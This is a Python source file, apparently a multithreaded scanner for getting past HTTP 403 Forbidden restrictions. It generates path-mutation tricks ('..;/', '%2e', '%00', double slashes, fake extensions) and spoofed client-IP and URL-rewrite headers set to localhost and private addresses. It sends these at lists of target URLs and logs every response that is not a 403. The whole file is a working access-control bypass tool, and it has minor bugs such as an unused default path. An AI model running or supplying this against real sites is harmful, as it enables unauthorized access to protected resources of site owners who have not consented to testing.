import requests
import validators
import os
import tldextract
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from colorama import init, Fore, Style
from pyfiglet import Figlet
from requests.packages import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json

# 禁用SSL警告信息
urllib3.disable_warnings()
# 初始化colorama库用于终端颜色输出
init()

# 导入dirsearch的日志模块
from lib.view.terminal import output
from lib.view.colors import set_color

class OptimizedArguments():
    """
    参数解析与验证类

    Args:
        url (str): 单个目标URL
        urllist (str): 包含多个URL的文件路径
        dir (str): 单个目录路径
        dirlist (str): 包含多个目录路径的文件路径

    Attributes:
        urls (list): 解析后的URL列表
        dirs (list): 解析后的目录路径列表
    """

    def __init__(self, url, urllist, dir, dirlist):
        self.url = url
        self.urllist = urllist
        self.dir = dir
        self.dirlist = dirlist
        self.urls = []
        self.dirs = []

        self.checkURL()
        self.checkDir()

    def return_urls(self):
        """
        返回解析后的URL列表

        Returns:
            list: URL列表
        """
        return self.urls

    def return_dirs(self):
        """
        返回解析后的目录路径列表

        Returns:
            list: 目录路径列表
        """
        return self.dirs

    def checkURL(self):
        """
        验证并处理URL参数
        支持单个URL或URL列表文件的处理
        """
        if self.url:
            # 验证URL格式是否正确
            if not validators.url(self.url):
                sys.exit()
            # 去除URL末尾的斜杠
            if self.url.endswith("/"):
                self.url = self.url.rstrip("/")
            self.urls.append(self.url)
        elif self.urllist:
            # 检查URL列表文件是否存在
            if not os.path.exists(self.urllist):
                sys.exit()
            # 读取URL列表文件
            with open(self.urllist, 'r') as file:
                temp = file.readlines()
            # 处理每行URL并添加到列表
            for x in temp:
                self.urls.append(x.strip())
        else:
            sys.exit()

    def checkDir(self):
        """
        验证并处理目录路径参数
        支持单个目录或目录列表文件的处理
        """
        if self.dir:
            # 确保目录路径以斜杠开头
            if not self.dir.startswith("/"):
                self.dir = "/" + self.dir
            # 处理根目录的特殊情况
            if self.dir.endswith("/") and self.dir != "/":
                self.dir = self.dir.rstrip("/")
            self.dirs.append(self.dir)
        elif self.dirlist:
            # 检查目录列表文件是否存在
            if not os.path.exists(self.dirlist):
                sys.exit()
            # 读取目录列表文件
            with open(self.dirlist, 'r') as file:
                temp = file.readlines()
            # 处理每行目录路径并添加到列表
            for x in temp:
                self.dirs.append(x.strip())
        else:
            # 默认设置为根目录
            self.dir = "/"

class OptimizedPathRepository():
    """
    路径变异处理类
    生成各种路径绕过和头部绕过的变体

    Args:
        path (str): 原始路径
    """

    def __init__(self, path):
        self.path = path
        self.newPaths = []
        self.newHeaders = []
        self.rewriteHeaders = []
        self.createNewPaths()
        self.createNewHeaders()

    def createNewPaths(self):
        """
        创建路径变异列表
        包括双斜杠、点号绕过、编码绕过等多种变体
        """
        self.newPaths.append(self.path)

        # 定义路径对组合用于绕过
        pairs = [["/", "//"], ["/.", "/./"]]
        # 定义前导绕过字符
        leadings = ["/%2e"]
        # 定义后缀绕过字符
        trailings = ["/", "/*/", "/*", "..;/", "/..;/", "%20", "%09", "%00",
                    ".json", ".css", ".html", "?", "??", "???",
                    "?testparam", "#", "#test", "/."]

        # 生成路径对组合
        for pair in pairs:
            self.newPaths.append(pair[0] + self.path + pair[1])
        # 生成前导绕过组合
        for leading in leadings:
            self.newPaths.append(leading + self.path)
        # 生成后缀绕过组合
        for trailing in trailings:
            self.newPaths.append(self.path + trailing)

    def createNewHeaders(self):
        """
        创建头部绕过变体
        包括IP伪造头部和路径重写头部
        """
        # 定义头部重写字段
        headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]
        # 定义IP伪造相关头部字段
        headers = ["X-Custom-IP-Authorization", "X-Forwarded-For",
                  "X-Forward-For", "X-Remote-IP", "X-Originating-IP",
                  "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]
        # 定义IP伪造值
        values = ["localhost", "localhost:80", "localhost:443",
                 "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443",
                 "2130706433", "0x7F000001", "0177.0000.0000.0001",
                 "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0",
                 "172.16.0.1", "192.168.1.0", "192.168.1.1"]

        # 生成IP伪造头部组合
        for header in headers:
            for value in values:
                self.newHeaders.append({header: value})
        # 生成路径重写头部组合
        for element in headers_overwrite:
            self.rewriteHeaders.append({element: self.path})

class OptimizedQuery():
    """
    HTTP请求查询处理类
    负责发送HTTP请求、处理响应和结果记录

    Args:
        url (str): 目标URL
        dir (str): 目录路径
        dirObject (OptimizedPathRepository): 路径仓库对象
        session (requests.Session, optional): HTTP会话对象
        timeout (int): 请求超时时间，默认为5秒
        max_retries (int): 最大重试次数，默认为2次
    """

    def __init__(self, url, dir, dirObject, session=None, timeout=5, max_retries=2):
        self.url = url
        self.dir = dir
        self.dirObject = dirObject
        # 提取域名用于文件命名
        self.domain = tldextract.extract(self.url).domain
        self.timeout = timeout
        self.max_retries = max_retries

        # 创建优化的session
        self.session = session or self._create_optimized_session()

        # 结果存储
        self.results = []
        self.lock = threading.Lock()

    def _create_optimized_session(self):
        """
        创建优化的HTTP会话配置
        包括连接池、重试策略和默认头部设置

        Returns:
            requests.Session: 配置好的会话对象
        """
        session = requests.Session()

        # 配置重试策略
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=0.1,
            status_forcelist=[429, 500, 502, 503, 504],
        )

        # 配置适配器
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=20,  # 连接池大小
            pool_maxsize=100,     # 最大连接数
            pool_block=False
        )

        session.mount("http://", adapter)
        session.mount("https://", adapter)

        # 设置默认headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })

        return session

    def checkStatusCode(self, status_code):
        """
        根据状态码返回对应的颜色代码

        Args:
            status_code (int): HTTP状态码

        Returns:
            str: 颜色代码字符串
        """
        if status_code in (200, 201, 204):
            return set_color(str(status_code), fore="green")
        elif status_code == 401:
            return set_color(str(status_code), fore="yellow")
        elif status_code == 403:
            return set_color(str(status_code), fore="blue")
        elif status_code in range(500, 600):
            return set_color(str(status_code), fore="red")
        elif status_code in range(300, 400):
            return set_color(str(status_code), fore="cyan")
        else:
            return set_color(str(status_code), fore="magenta")

    def send_request(self, method, url, **kwargs):
        """
        发送HTTP请求的封装方法

        Args:
            method (str): HTTP方法(GET/POST等)
            url (str): 请求URL
            **kwargs: 其他请求参数

        Returns:
            requests.Response or None: 响应对象或None(失败时)
        """
        try:
            response = self.session.request(
                method, url,
                timeout=self.timeout,
                verify=False,
                **kwargs
            )
            return response
        except requests.RequestException:
            return None

    def process_path(self, path, method='GET', headers=None):
        """
        处理单个路径请求并记录结果

        Args:
            path (str): 请求路径
            method (str): HTTP方法，默认为GET
            headers (dict, optional): 自定义请求头

        Returns:
            dict or None: 结果字典或None(失败时)
        """
        try:
            r = self.send_request(method, self.url + path, headers=headers)
            if r is None:
                return None

            colour = self.checkStatusCode(r.status_code)
            line_width = 70

            target_address = f"{method} --> {self.url}{path}"
            info = f"STATUS: {colour}\tSIZE: {len(r.content)}"
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
            remaining = line_width - len(target_address)

            result = {
                'target': target_address,
                'info': info,
                'info_pure': info_pure,
                'remaining': remaining,
                'status_code': r.status_code,
                'content_length': len(r.content),
                'headers': headers
            }

            # 只显示非403状态码
            if r.status_code != 403:
                current_time = time.strftime("%H:%M:%S")
                message = f"[{current_time}] {target_address} " + " " * remaining + info
                output.new_line(message)
                if headers:
                    header_message = f"[{current_time}] Header= {headers}"
                    output.new_line(header_message)

            return result
        except Exception:
            return None

    def manipulateRequest(self):
        """
        执行完整的请求处理流程
        包括POST请求、路径变异和头部变异处理
        """
        # POST请求
        post_result = self.process_path(self.dir, 'POST')
        if post_result:
            self.results.append(post_result)

        # 并发处理路径变异
        self._process_paths_concurrently()

        # 并发处理header变异
        self._process_headers_concurrently()

    def _process_paths_concurrently(self):
        """
        并发处理路径变异请求
        使用线程池提高处理效率
        """
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for path in self.dirObject.newPaths:
                future = executor.submit(self.process_path, path)
                futures.append(future)

            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)

    def _process_headers_concurrently(self):
        """
        并发处理头部变异请求
        分别处理普通头部和重写头部
        """
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []

            # 处理普通headers
            for header in self.dirObject.newHeaders:
                future = executor.submit(self.process_path, self.dir, 'GET', header)
                futures.append(future)

            # 处理重写headers
            for header in self.dirObject.rewriteHeaders:
                future = executor.submit(self.process_path, '', 'GET', header)
                futures.append(future)

            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.results.append(result)

    def writeToFile(self):
        """
        将结果批量写入文件
        文件名为域名.txt
        """
        if not self.results:
            return

        filename = f"{self.domain}.txt"
        with open(filename, "a") as file:
            for result in self.results:
                line = result['target'] + " " * result['remaining'] + result['info_pure']
                if result['headers']:
                    line += f"---Header= {result['headers']}"
                file.write(line + "\n")

class OptimizedProgram():
    """
    主程序控制类
    负责协调整个扫描过程，包括多线程处理和资源管理

    Args:
        urllist (list): URL列表
        dirlist (list): 目录路径列表
        max_workers (int): 最大工作线程数，默认为20
    """

    def __init__(self, urllist, dirlist, max_workers=40):
        self.urllist = urllist
        self.dirlist = dirlist
        self.max_workers = max_workers
        # 创建共享的session池
        self.session_pool = Queue()
        for _ in range(min(10, len(urllist))):
            self.session_pool.put(self._create_optimized_session())

    def _create_optimized_session(self):
        """
        创建优化的HTTP会话

        Returns:
            requests.Session: 配置好的会话对象
        """
        session = requests.Session()

        retry_strategy = Retry(
            total=2,
            backoff_factor=0.1,
            status_forcelist=[429, 500, 502, 503, 504],
        )

        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=20,
            pool_maxsize=100,
            pool_block=False
        )

        session.mount("http://", adapter)
        session.mount("https://", adapter)

        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })

        return session

    def _get_session(self):
        """
        从会话池中获取会话对象

        Returns:
            requests.Session: 会话对象
        """
        try:
            return self.session_pool.get_nowait()
        except:
            return self._create_optimized_session()

    def _return_session(self, session):
        """
        将会话对象归还到会话池

        Args:
            session (requests.Session): 要归还的会话对象
        """
        try:
            self.session_pool.put_nowait(session)
        except:
            pass

    def process_url_dir_combination(self, url, dir_path):
        """
        处理单个URL和目录路径的组合

        Args:
            url (str): 目标URL
            dir_path (str): 目录路径
        """
        session = self._get_session()
        try:
            if dir_path != "/":
                dir_objname = dir_path.lstrip("/")
            else:
                dir_objname = "_rootPath"

            dir_obj = OptimizedPathRepository(dir_path)
            query = OptimizedQuery(url, dir_path, dir_obj, session=session)
            query.manipulateRequest()
            query.writeToFile()
        finally:
            self._return_session(session)

    def initialise(self):
        """
        初始化并启动主程序执行流程
        使用线程池并发处理所有URL和目录路径的组合
        """
        current_time = time.strftime("%H:%M:%S")
        message = f"[{current_time}] 开始处理 {len(self.urllist)} 个URL和 {len(self.dirlist)} 个路径"
        output.new_line(set_color(message, fore="green"))
        
        current_time = time.strftime("%H:%M:%S")
        message = f"[{current_time}] 使用 {self.max_workers} 个并发工作线程"
        output.new_line(set_color(message, fore="green"))

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []

            # 为每个URL和路径组合创建任务
            for url in self.urllist:
                for dir_path in self.dirlist:
                    future = executor.submit(self.process_url_dir_combination, url, dir_path)
                    futures.append(future)

            # 等待所有任务完成并显示进度
            completed = 0
            total = len(futures)
            
            for future in as_completed(futures):
                try:
                    future.result()
                    completed += 1
                    if completed % 10 == 0:
                        current_time = time.strftime("%H:%M:%S")
                        message = f"[{current_time}] 进度: {completed}/{total} ({completed/total*100:.1f}%)"
                        output.new_line(set_color(message, fore="cyan"))
                except Exception as e:
                    current_time = time.strftime("%H:%M:%S")
                    message = f"[{current_time}] 任务执行出错: {e}"
                    output.error(set_color(message, fore="red"))
        
        end_time = time.time()
        current_time = time.strftime("%H:%M:%S")
        message = f"[{current_time}] 处理完成! 总耗时: {end_time - start_time:.2f} 秒"
        output.new_line(set_color(message, fore="green"))
        
        current_time = time.strftime("%H:%M:%S")
        message = f"[{current_time}] 平均每个任务耗时: {(end_time - start_time) / total:.2f} 秒"
        output.new_line(set_color(message, fore="green"))
